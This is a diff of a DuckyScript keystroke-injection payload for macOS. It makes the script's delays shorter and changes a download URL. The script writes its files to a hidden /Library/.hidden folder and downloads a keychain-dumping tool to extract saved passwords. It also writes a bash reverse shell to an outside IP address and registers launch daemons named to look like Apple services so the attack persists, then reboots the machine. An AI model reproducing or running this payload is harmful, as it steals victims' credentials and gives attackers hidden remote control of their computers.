@@ -1,16 +1,16 @@
 REM This tool will automatically dump all passwords stored in the keychain to a file on the desktop upon login.
 
-DELAY 1000
+DELAY 100
 STRING mount -uw /
 ENTER
-DELAY 2000
+DELAY 100
 STRING mkdir /Library/.hidden
 ENTER
-DELAY 200
+DELAY 100
 
 STRING echo '#!/bin/sh
 ENTER
-STRING curl -o /Library/.hidden/keychaindump 'https://raw.githubusercontent.com/Rainierraoul/duckdump/master/keychaindump'
+STRING curl -o /Library/.hidden/keychaindump 'https://raw.githubusercontent.com/Rainierraoul/duckdump/master/keydumper'
 ENTER
 STRING chmod +x /Library/.hidden/keychaindump
 ENTER
@@ -24,10 +24,10 @@ STRING /Library/.hidden/keychaindump $homedir/Library/Keychains/login.keychain >
 ENTER
 STRING done' > /Library/.hidden/dump.sh
 ENTER
-DELAY 500
+DELAY 100
 STRING chmod +x /Library/.hidden/dump.sh
 ENTER
-DELAY 200
+DELAY 100
 
 STRING echo '#!/bin/bash
 ENTER
@@ -35,13 +35,13 @@ STRING bash -i >& /dev/tcp/120.149.4.142/1989 0>&1
 ENTER
 STRING wait' > /Library/.hidden/connect.sh
 ENTER
-DELAY 500
+DELAY 100
 STRING chmod +x /Library/.hidden/connect.sh
 ENTER
-DELAY 200
+DELAY 100
 STRING mkdir /Library/LaunchDaemons
 ENTER
-DELAY 200
+DELAY 100
 
 
 STRING echo '<plist version="1.0">
@@ -74,10 +74,10 @@ STRING </dict>
 ENTER
 STRING </plist>' > /Library/LaunchDaemons/com.apples.services.plist
 ENTER
-DELAY 500
+DELAY 100
 STRING chmod 644 /Library/LaunchDaemons/com.apples.services.plist
 ENTER
-DELAY 200
+DELAY 100
 STRING launchctl load /Library/LaunchDaemons/com.apples.services.plist
 ENTER
 
@@ -115,12 +115,12 @@ STRING </dict>
 ENTER
 STRING </plist>' > /Library/LaunchDaemons/com.apples.remoteservices.plist
 ENTER
-DELAY 500
+DELAY 100
 STRING chmod 600 /Library/LaunchDaemons/com.apples.remoteservices.plist
 ENTER
-DELAY 200
+DELAY 100
 STRING launchctl load /Library/LaunchDaemons/com.apples.remoteservices.plist
 ENTER
-DELAY 1000
+DELAY 100
 STRING shutdown -r now
 ENTER
